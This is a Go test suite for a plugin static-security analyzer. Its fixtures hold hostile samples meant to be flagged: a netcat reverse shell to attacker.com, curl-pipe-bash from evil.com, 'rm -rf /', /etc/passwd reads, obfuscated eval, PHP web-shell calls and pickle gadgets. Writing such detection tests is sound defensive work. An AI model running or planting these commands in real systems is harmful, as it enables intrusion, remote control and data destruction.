package pluginrunner

import (
	"os"
	"strings"
	"path/filepath"
	"testing"
)

func writeFile(t *testing.T, dir, name, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(filepath.Join(dir, name)), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
}

func TestAnalyzePlugin_CleanPlugin(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
import grpc
def on_event(event):
    print("received", event.type)
`)
	writeFile(t, dir, "plugin.yaml", `
name: clean-plugin
version: 1.0.0
entrypoint: python main.py
language: python
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Safe {
		t.Errorf("expected safe plugin, got %d findings", len(report.Findings))
	}
	if report.TotalFilesScanned != 2 {
		t.Errorf("expected 2 files scanned, got %d", report.TotalFilesScanned)
	}
}

func TestAnalyzePlugin_ShellExec(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
import os
os.system("rm -rf /")
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected shell_exec critical finding")
	}
}

func TestAnalyzePlugin_ReverseShell(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "backdoor.sh", `#!/bin/bash
nc -e /bin/sh attacker.com 4444
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "network" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected network critical finding")
	}
}

func TestAnalyzePlugin_Eval(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "exploit.py", `
payload = base64.b64decode("aW1wb3J0IG9z")
eval(payload)
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	categories := map[string]bool{}
	for _, f := range report.Findings {
		categories[f.Category] = true
	}
	if !categories["obfuscation"] {
		t.Error("expected obfuscation finding")
	}
}

func TestAnalyzePlugin_CryptoMining(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "miner.js", `
const pool = "stratum+tcp://pool.monero.com:3333";
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "cryptomining" {
			found = true
		}
	}
	if !found {
		t.Error("expected cryptomining finding")
	}
}

func TestAnalyzePlugin_RuntimeInstall(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "setup.sh", `#!/bin/bash
curl https://evil.com/payload.sh | bash
pip install evil-package
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "runtime_install" {
			found = true
		}
	}
	if !found {
		t.Error("expected runtime_install finding")
	}
}

func TestAnalyzePlugin_NetworkWarning(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "fetcher.py", `
import requests
resp = requests.get("https://api.anilist.co/graphql")
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	// network access is WARNING not CRITICAL - plugin is still "safe"
	if !report.Safe {
		t.Error("expected safe plugin (network is warning, not critical)")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "network" && f.Severity == SeverityWarning {
			found = true
		}
	}
	if !found {
		t.Error("expected network warning finding")
	}
}

func TestAnalyzePlugin_PrivilegeEscalation(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "escalate.sh", `#!/bin/bash
sudo chmod u+s /usr/bin/something
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
}

func TestAnalyzePlugin_SignalPID1_Obfuscated(t *testing.T) {
	cases := map[string]string{
		"direct":            `process.kill(1, 0)`,
		"bracket":           `process["kill"](1, 0)`,
		"concat_in_bracket": `process["ki" + "ll"](1, 0)`, // normalizer folds the concat → process["kill"](1
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "main.js", src)
			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			if report.Safe {
				t.Errorf("expected unsafe - %q should be flagged as signalling PID 1", src)
			}
		})
	}
}

func TestAnalyzePlugin_ScansNodeModulesForCriticalOnly(t *testing.T) {
	// node_modules used to be skipped whole, which hid a payload buried in a
	// dependency (redteam-bridge, 2026-09-02). It is now walked: vendored code
	// runs, so a Critical finding there counts, and the file IS scanned.
	dir := t.TempDir()
	writeFile(t, dir, "index.js", `console.log("clean")`)
	writeFile(t, dir, "node_modules/evil/index.js", `eval("malicious")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Error("eval() in a vendored dep must make the plugin UNSAFE, not be skipped")
	}
	if report.TotalFilesScanned != 2 {
		t.Errorf("expected both files scanned, got %d", report.TotalFilesScanned)
	}
}

func TestAnalyzePlugin_SkipsBinaryFiles(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "plugin.bin", string([]byte{0x7f, 'E', 'L', 'F'}))
	writeFile(t, dir, "main.py", `print("clean")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.TotalFilesScanned != 2 {
		t.Errorf("expected 2 files scanned (.bin counted with warning), got %d", report.TotalFilesScanned)
	}
	var found bool
	for _, f := range report.Findings {
		if f.Category == "compiled_binary" && f.File == "plugin.bin" {
			found = true
		}
	}
	if !found {
		t.Error("expected compiled_binary warning for plugin.bin")
	}
}

func TestAnalyzePlugin_ExtractsURLs(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "fetcher.py", `
import requests
API = "https://graphql.anilist.co"
resp = requests.get(f"https://api.example.com/{media_id}")
base = "https://" + host + "/api"
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.URLs) == 0 {
		t.Fatal("expected URLs to be extracted")
	}
	types := map[string]bool{}
	for _, u := range report.URLs {
		types[u.Type] = true
	}
	if !types["literal"] {
		t.Error("expected literal URL")
	}
	if !types["template"] {
		t.Error("expected template URL")
	}
	if !types["concatenation"] {
		t.Error("expected concatenation URL")
	}
}

func TestAnalyzePlugin_NoURLsInCleanPlugin(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
def hello():
    return "world"
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.URLs) != 0 {
		t.Errorf("expected no URLs, got %d", len(report.URLs))
	}
}

func TestAnalyzePlugin_DeduplicatesURLs(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
url = "https://api.example.com/v1"
other = "https://api.example.com/v1"
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	count := 0
	for _, u := range report.URLs {
		if u.URL == "https://api.example.com/v1" {
			count++
		}
	}
	if count != 1 {
		t.Errorf("expected 1 deduplicated URL, got %d", count)
	}
}

func TestAnalyzePlugin_ExtractsNonHTTPSchemes(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
ws_url = "wss://realtime.example.com/ws"
ftp_url = "ftp://files.example.com/data.csv"
db_url = "postgresql://user:pass@db.example.com/mydb"
ssh_url = "ssh://deploy@server.example.com"
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	schemes := map[string]bool{}
	for _, u := range report.URLs {
		for _, prefix := range []string{"wss://", "ftp://", "postgresql://", "ssh://"} {
			if len(u.URL) >= len(prefix) && u.URL[:len(prefix)] == prefix {
				schemes[prefix] = true
			}
		}
	}
	for _, expected := range []string{"wss://", "ftp://", "postgresql://", "ssh://"} {
		if !schemes[expected] {
			t.Errorf("expected %s URL to be extracted", expected)
		}
	}
}

func TestAnalyzePlugin_SuspiciousSchemeWarning(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
ws = "wss://evil.com/exfil"
ssh = "ssh://root@target.com"
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "suspicious_url" {
			found = true
		}
	}
	if !found {
		t.Error("expected suspicious_url warning for non-HTTP schemes")
	}
}

func TestAnalyzePlugin_SensitiveFiles(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "exfil.py", `
with open("/etc/passwd") as f:
    data = f.read()
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe - access to /etc/passwd")
	}
}

// L2 - obfuscation gaps that the original ruleset missed.

func TestAnalyzePlugin_PHPChrChain_NoDot(t *testing.T) {
	dir := t.TempDir()
	// PHP 8 short concat / array glue without explicit dot - original
	// regex required `chr(N).` repeated 3+ times, missing this form.
	writeFile(t, dir, "shell.php", `<?php
$x = chr(115) . chr(121) . chr(115);  // dot form (existing rule)
$y = chr(99) chr(109) chr(100);       // no-dot form (new rule)
echo $x.$y;
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "obfuscation" {
			found = true
		}
	}
	if !found {
		t.Error("expected obfuscation finding for PHP chr() chain (no-dot form)")
	}
}

func TestAnalyzePlugin_RequireArrayJoin(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "evil.js", `
const cp = require(["child", "_process"].join(""));
cp.exec("id");
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "obfuscation" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected critical obfuscation finding for require([...].join())")
	}
}

func TestAnalyzePlugin_FromCharCodeChain(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "obf.js", `
var p = String.fromCharCode(102, 101, 116, 99, 104);
window[p]("https://evil.com");
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "obfuscation" {
			found = true
		}
	}
	if !found {
		t.Error("expected obfuscation finding for String.fromCharCode chain")
	}
}

func TestAnalyzePlugin_PythonChrJoin(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "obf.py", `
mod = "".join([chr(111), chr(115)])  # builds "os"
__import__(mod).system("id")
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "obfuscation" {
			found = true
		}
	}
	if !found {
		t.Error("expected obfuscation finding for Python chr-list join")
	}
}

func TestAnalyzePlugin_FromCharCodeShort_NoFalsePositive(t *testing.T) {
	dir := t.TempDir()
	// Single-arg fromCharCode is legitimate (BOM strip etc.) - must not trip.
	writeFile(t, dir, "ok.js", `
var bom = String.fromCharCode(0xfeff);
console.log(bom);
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.Category == "obfuscation" {
			t.Errorf("unexpected obfuscation hit on single-arg fromCharCode: %+v", f)
		}
	}
}

func TestAnalyze_CleanPlugin_IsSafe(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `print("hello")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Safe {
		t.Fatal("expected Safe=true for clean plugin")
	}
	if len(report.Findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(report.Findings))
	}
}

func TestAnalyze_CriticalFinding_IsUnsafe(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "bad.py", `os.system("whoami")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected Safe=false when critical finding exists")
	}
	hasCritical := false
	for _, f := range report.Findings {
		if f.Severity == SeverityCritical {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Fatal("expected at least one critical finding")
	}
}

func TestAnalyze_WarningOnly_StillSafe(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "net.py", `requests.get("https://example.com")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Safe {
		t.Fatal("expected Safe=true - warnings should not make plugin unsafe")
	}
	if len(report.Findings) == 0 {
		t.Fatal("expected at least one warning finding")
	}
	for _, f := range report.Findings {
		if f.Severity == SeverityCritical {
			t.Fatal("unexpected critical finding")
		}
	}
}

func TestAnalyze_VendoredWarningsStaySilent(t *testing.T) {
	// The other half of the rule: warning-level behaviour in a vendored library
	// (a network call) must NOT surface, or the report drowns in noise from
	// legitimate dependencies and the admin stops reading it.
	dir := t.TempDir()
	writeFile(t, dir, "clean.js", `console.log("ok")`)
	writeFile(t, dir, "node_modules/pkg/index.js", `fetch("https://api.example.com")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if strings.Contains(f.File, "node_modules") && f.Severity != SeverityCritical {
			t.Fatalf("vendored warning leaked: %s in %s", f.Category, f.File)
		}
	}
	if !report.Safe {
		t.Error("an ordinary vendored network call must not block a plugin")
	}
}

func TestAnalyze_SkipsBinaryExtensions(t *testing.T) {
	dir := t.TempDir()
	for _, ext := range []string{".so", ".dll"} {
		writeFile(t, dir, "lib"+ext, `eval("should not be scanned")`)
	}
	// Valid PNG magic bytes
	writeFile(t, dir, "icon.png", string([]byte{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A}))
	writeFile(t, dir, "clean.py", `print("ok")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	// .so and .dll = executable (counted + warning), .png = valid asset (skipped), clean.py = scanned
	if report.TotalFilesScanned != 3 {
		t.Errorf("expected 3 files scanned (.png skipped, .so/.dll warned), got %d", report.TotalFilesScanned)
	}
	var binaryWarnings int
	for _, f := range report.Findings {
		if f.Category == "compiled_binary" {
			binaryWarnings++
		}
	}
	if binaryWarnings != 2 {
		t.Errorf("expected 2 compiled_binary warnings (.so/.dll), got %d", binaryWarnings)
	}
	if !report.Safe {
		t.Fatal("expected safe - compiled_binary is WARNING not CRITICAL")
	}
}

func TestAnalyze_MIMEMismatch(t *testing.T) {
	dir := t.TempDir()
	// ELF binary disguised as .png
	writeFile(t, dir, "evil.png", string([]byte{0x7f, 'E', 'L', 'F', 0, 0, 0, 0}))

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	var found bool
	for _, f := range report.Findings {
		if f.Category == "mime_mismatch" && f.File == "evil.png" {
			found = true
		}
	}
	if !found {
		t.Error("expected mime_mismatch finding for disguised .png")
	}
	if report.Safe {
		t.Error("expected unsafe - mime_mismatch should mark report as not safe")
	}
}

func TestAnalyze_ScansUnknownExtensions(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "data.txt", `os.system("pwned")`)
	writeFile(t, dir, "backup.bak", `subprocess.call("rm -rf /")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.TotalFilesScanned != 2 {
		t.Errorf("expected 2 files scanned (.txt and .bak), got %d", report.TotalFilesScanned)
	}
	if report.Safe {
		t.Fatal("expected unsafe - .txt/.bak files should be scanned")
	}
}

func TestAnalyze_DynamicImport_Critical(t *testing.T) {
	for _, code := range []string{
		`__import__("os")`,
		`importlib.import_module("os")`,
	} {
		t.Run(code, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "exploit.py", code)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			if report.Safe {
				t.Fatalf("expected unsafe for %q", code)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "dynamic_import" && f.Severity == SeverityCritical {
					found = true
				}
			}
			if !found {
				t.Errorf("expected dynamic_import critical finding for %q", code)
			}
		})
	}
}

func TestAnalyze_NodeVmEscape_Critical(t *testing.T) {
	for _, code := range []string{
		`vm.runInNewContext("code")`,
		`new Function("return this")()`,
	} {
		t.Run(code, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "escape.js", code)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			if report.Safe {
				t.Fatalf("expected unsafe for %q", code)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "sandbox_escape" && f.Severity == SeverityCritical {
					found = true
				}
			}
			if !found {
				t.Errorf("expected sandbox_escape critical for %q", code)
			}
		})
	}
}

func TestAnalyze_CtypesCDLL_Critical(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "native.py", `lib = ctypes.CDLL("libc.so.6")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe for ctypes.CDLL")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "native_code" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected native_code critical finding")
	}
}

func TestAnalyze_URLExtraction_Dedup(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "urls.py", `
url1 = "https://same.example.com/api"
url2 = "https://same.example.com/api"
url3 = "https://same.example.com/api"
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	count := 0
	for _, u := range report.URLs {
		if u.URL == "https://same.example.com/api" {
			count++
		}
	}
	if count != 1 {
		t.Errorf("expected URL to appear exactly once, got %d", count)
	}
}

func TestAnalyze_SuspiciousScheme_Warning(t *testing.T) {
	for _, scheme := range []string{"ssh://host.com", "telnet://host.com"} {
		t.Run(scheme, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "test.py", `url = "`+scheme+`"`)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "suspicious_url" && f.Severity == SeverityWarning {
					found = true
				}
			}
			if !found {
				t.Errorf("expected suspicious_url warning for %s", scheme)
			}
		})
	}
}

func TestAnalyze_DepManifest_Warning(t *testing.T) {
	dir := t.TempDir()
	// package.json that DECLARES deps but ships none vendored - should warn.
	writeFile(t, dir, "package.json", `{"name":"t","version":"1.0.0","dependencies":{"left-pad":"1.3.0"}}`)
	writeFile(t, dir, "main.js", `console.log("ok")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "unvendored_deps" && f.Severity == SeverityWarning {
			found = true
		}
	}
	if !found {
		t.Error("expected unvendored_deps warning for package.json with deps")
	}
}

func TestAnalyze_DepManifest_NoDeps_NoWarning(t *testing.T) {
	dir := t.TempDir()
	// Metadata-only package.json (no deps declared) - must NOT warn.
	writeFile(t, dir, "package.json", `{"name":"t","version":"1.0.0"}`)
	writeFile(t, dir, "main.js", `console.log("ok")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.Category == "unvendored_deps" {
			t.Errorf("unexpected unvendored_deps warning: %+v", f)
		}
	}
}

func TestSeverityLabel(t *testing.T) {
	tests := []struct {
		s    AnalysisSeverity
		want string
	}{
		{SeverityCritical, "CRITICAL"},
		{SeverityWarning, "WARNING"},
		{SeverityInfo, "INFO"},
		{AnalysisSeverity(99), "INFO"},
	}
	for _, tt := range tests {
		if got := severityLabel(tt.s); got != tt.want {
			t.Errorf("severityLabel(%d) = %q, want %q", tt.s, got, tt.want)
		}
	}
}

func TestNewStaticAnalyzer(t *testing.T) {
	a := NewStaticAnalyzer()
	if a == nil {
		t.Fatal("expected non-nil analyzer")
	}
}

func TestStaticAnalyzer_Analyze_CleanPlugin(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `print("hello")`)

	a := NewStaticAnalyzer()
	report, err := a.Analyze(dir, "")
	if err != nil {
		t.Fatal(err)
	}
	if !report.Safe {
		t.Error("expected safe plugin")
	}
	if report.FileCount != 1 {
		t.Errorf("expected 1 file, got %d", report.FileCount)
	}
}

func TestStaticAnalyzer_Analyze_UnsafePlugin(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "bad.py", `os.system("whoami")`)

	a := NewStaticAnalyzer()
	report, err := a.Analyze(dir, "")
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Error("expected unsafe plugin")
	}
	if len(report.Issues) == 0 {
		t.Error("expected issues to be reported")
	}
}

func TestStaticAnalyzer_Analyze_WithURLs(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "net.py", `url = "https://api.example.com/v1"`)

	a := NewStaticAnalyzer()
	report, err := a.Analyze(dir, "")
	if err != nil {
		t.Fatal(err)
	}
	if len(report.URLs) == 0 {
		t.Error("expected URLs in report")
	}
}

func TestStaticAnalyzer_Analyze_InvalidDir(t *testing.T) {
	a := NewStaticAnalyzer()
	_, err := a.Analyze("/nonexistent/path/to/plugin", "")
	if err == nil {
		t.Error("expected error for nonexistent dir")
	}
}

func TestAnalyzer_Deserialization(t *testing.T) {
	tests := []struct {
		name    string
		content string
		wantCat string
		wantSev AnalysisSeverity
	}{
		{"pickle.loads", "data = pickle.loads(b'...')", "deserialization", SeverityCritical},
		{"pickle.load", "obj = pickle.load(f)", "deserialization", SeverityCritical},
		{"marshal.loads", "x = marshal.loads(data)", "deserialization", SeverityCritical},
		{"yaml.load no loader", "cfg = yaml.load(data)", "deserialization", SeverityWarning},
		{"__reduce__", "def __reduce__(self): return (os.system, ('id',))", "deserialization", SeverityCritical},
		{"__reduce_ex__", "def __reduce_ex__(self, proto): return ...", "deserialization", SeverityCritical},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "exploit.py", tt.content)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == tt.wantCat && f.Severity == tt.wantSev {
					found = true
				}
			}
			if !found {
				t.Errorf("expected %s/%d finding for %q", tt.wantCat, tt.wantSev, tt.content)
			}
		})
	}
}

func TestAnalyzer_ClassHierarchy(t *testing.T) {
	tests := []string{
		`klass.__class__.__bases__`,
		`for c in object.__subclasses__(): pass`,
		`for t in cls.__mro__: pass`,
	}
	for _, code := range tests {
		t.Run(code, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "escape.py", code)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			if report.Safe {
				t.Fatalf("expected unsafe for %q", code)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "sandbox_escape" && f.Severity == SeverityCritical {
					found = true
				}
			}
			if !found {
				t.Errorf("expected sandbox_escape critical for %q", code)
			}
		})
	}
}

func TestAnalyzer_PHPExec(t *testing.T) {
	tests := []struct {
		name    string
		content string
		wantCat string
		wantSev AnalysisSeverity
	}{
		{"preg_replace /e", `preg_replace('/(.+)/e', '$1', $input);`, "shell_exec", SeverityCritical},
		{"assert base64_decode", `assert(base64_decode($payload));`, "obfuscation", SeverityCritical},
		{"assert $_GET", `assert($_GET['cmd']);`, "obfuscation", SeverityCritical},
		{"str_rot13", `eval(str_rot13('flfgrz("vq");'));`, "obfuscation", SeverityWarning},
		{"system()", `system($_GET['cmd']);`, "shell_exec", SeverityCritical},
		{"passthru()", `passthru($cmd);`, "shell_exec", SeverityCritical},
		{"shell_exec()", `$out = shell_exec('id');`, "shell_exec", SeverityCritical},
		{"proc_open()", `$p = proc_open($cmd, $desc, $pipes);`, "shell_exec", SeverityCritical},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "exploit.php", tt.content)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == tt.wantCat && f.Severity == tt.wantSev {
					found = true
				}
			}
			if !found {
				t.Errorf("expected %s/%d finding for %q", tt.wantCat, tt.wantSev, tt.content)
			}
		})
	}
}

func TestAnalyzer_RubyExec(t *testing.T) {
	tests := []struct {
		name    string
		content string
		wantCat string
		wantSev AnalysisSeverity
	}{
		{"backtick", "`id`", "shell_exec", SeverityWarning},
		{"Kernel.exec", `Kernel.exec("id")`, "shell_exec", SeverityCritical},
		{"Kernel.system", `Kernel.system("ls")`, "shell_exec", SeverityCritical},
		{"IO.popen", `IO.popen("cmd")`, "shell_exec", SeverityCritical},
		{"open pipe prefix", `open("|id")`, "shell_exec", SeverityCritical},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "exploit.rb", tt.content)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == tt.wantCat && f.Severity == tt.wantSev {
					found = true
				}
			}
			if !found {
				t.Errorf("expected %s/%d finding for %q", tt.wantCat, tt.wantSev, tt.content)
			}
		})
	}
}

func TestAnalyzer_RubyExec_NotFiredOnNonRuby(t *testing.T) {
	// Backtick rule is scoped to .rb - should not fire on .py files
	dir := t.TempDir()
	writeFile(t, dir, "clean.py", "result = `id`")

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Pattern == "`id`" {
			t.Error("Ruby backtick rule should not fire on .py files")
		}
	}
}

func TestAnalyzer_GoUnsafe(t *testing.T) {
	tests := []struct {
		name    string
		content string
	}{
		{"unsafe.Pointer", `p := unsafe.Pointer(&x)`},
		{"unsafe.Slice", `s := unsafe.Slice(ptr, n)`},
		{"unsafe.SliceData", `d := unsafe.SliceData(s)`},
		{"unsafe.StringData", `d := unsafe.StringData(str)`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "exploit.go", tt.content)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "native_code" && f.Severity == SeverityWarning {
					found = true
				}
			}
			if !found {
				t.Errorf("expected native_code warning for %q", tt.content)
			}
			// unsafe rules are warnings - plugin still safe
			if !report.Safe {
				t.Error("expected safe plugin - unsafe.* is WARNING not CRITICAL")
			}
		})
	}
}

func TestAnalyzer_GoUnsafe_NotFiredOnNonGo(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "clean.py", "p = unsafe.Pointer(x)")

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.Category == "native_code" && f.Description == "Go unsafe.Pointer (bypasses type safety)" {
			t.Error("Go unsafe.Pointer rule should not fire on .py files")
		}
	}
}

func TestAnalyzer_ShellBase64Pipe(t *testing.T) {
	tests := []struct {
		name    string
		content string
	}{
		{"base64 -d pipe bash", `base64 -d payload.b64 | bash`},
		{"base64 --decode pipe sh", `base64 --decode encoded.txt | sh`},
		{"openssl enc -d pipe zsh", `openssl enc -d -base64 -in f | zsh`},
		{"echo blob pipe base64", `echo aW1wb3J0IG9zOyBvcy5zeXN0ZW0oInJtIC1yZiAvIik= | base64`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "payload.sh", tt.content)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			if report.Safe {
				t.Fatalf("expected unsafe for %q", tt.content)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "obfuscation" && f.Severity == SeverityCritical {
					found = true
				}
			}
			if !found {
				t.Errorf("expected obfuscation critical for %q", tt.content)
			}
		})
	}
}

func TestAnalyze_SDKStubsSkipped(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "plugin_pb2.py", `eval("should not be scanned")`)
	writeFile(t, dir, "plugin_pb2_grpc.py", `os.system("hidden")`)
	writeFile(t, dir, "plugin.proto", `exec("hidden")`)
	writeFile(t, dir, "main.py", `print("clean")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.TotalFilesScanned != 1 {
		t.Errorf("expected 1 file scanned (stubs skipped), got %d", report.TotalFilesScanned)
	}
	if !report.Safe {
		t.Fatal("expected safe - SDK stubs should be skipped entirely")
	}
}

func TestAnalyze_Deserialization_Pickle_Critical(t *testing.T) {
	for _, code := range []string{
		`data = pickle.loads(payload)`,
		`obj = pickle.load(f)`,
		`marshal.loads(raw)`,
	} {
		t.Run(code, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "exploit.py", code)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			if report.Safe {
				t.Fatalf("expected unsafe for %q", code)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "deserialization" && f.Severity == SeverityCritical {
					found = true
				}
			}
			if !found {
				t.Errorf("expected deserialization critical finding for %q", code)
			}
		})
	}
}

func TestAnalyze_Deserialization_YamlLoad_Warning(t *testing.T) {
